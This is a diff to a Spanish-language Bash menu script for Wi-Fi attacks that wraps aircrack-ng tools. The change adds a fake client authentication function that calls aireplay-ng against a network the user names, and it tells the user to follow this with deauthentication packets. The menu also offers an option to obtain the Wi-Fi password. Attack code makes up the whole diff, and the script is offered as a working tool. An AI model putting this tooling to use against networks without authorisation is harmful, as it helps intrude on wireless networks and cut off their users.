@@ -197,6 +197,29 @@ macAttack(){
 
 }
 
+# Escoge esta opción sólo si no hay clientes conectados a la red
+
+fakeAuth(){
+
+  echo " "
+  echo "Vamos a proceder a autenticar un falso cliente en la red, desde la Terminal 1 podrás ver cómo este es añadido"
+  echo " "
+  echo "Posteriormente, selecciona la opción 5 para mandar paquetes de deautenticación a dicho cliente"
+  echo " "
+  sleep 5
+  echo -n "Escribe una dirección MAC (Puedes usar a clientes no asociados o tu propia dirección MAC [La nueva]): "
+  read fakeMAC
+  echo " "
+  echo -n "Escribe el nombre del Wifi: "
+  read wifiName
+  echo " "
+  echo "Procedemos..."
+  echo " "
+  sleep 3
+  aireplay-ng -1 0 -e $wifiName -h $fakeMAC --ignore-negative-one mon0
+
+}
+
 while true
   do
 
@@ -209,8 +232,9 @@ while true
     echo "3. Dar de baja el modo monitor"
     echo "4. Escanear redes wifis"
     echo "5. Deautenticación a dirección MAC"
-    echo "6. Obtener contraseña Wifi"
-    echo "7. Reiniciar programa"
+    echo "6. Falsa autenticación de cliente"
+    echo "7. Obtener contraseña Wifi"
+    echo "8. Reiniciar programa"
     echo "---------------------------"
     echo "0. Salir "
     echo "---------------------------"
@@ -234,9 +258,12 @@ while true
       macAttack
     fi
     if [ "$opcionMenu" = "6" ]; then
-      wifiPassword
+      fakeAuth
     fi
     if [ "$opcionMenu" = "7" ]; then
+      wifiPassword
+    fi
+    if [ "$opcionMenu" = "8" ]; then
       resetProgram
     fi
     if [ "$opcionMenu" = "0" ]; then
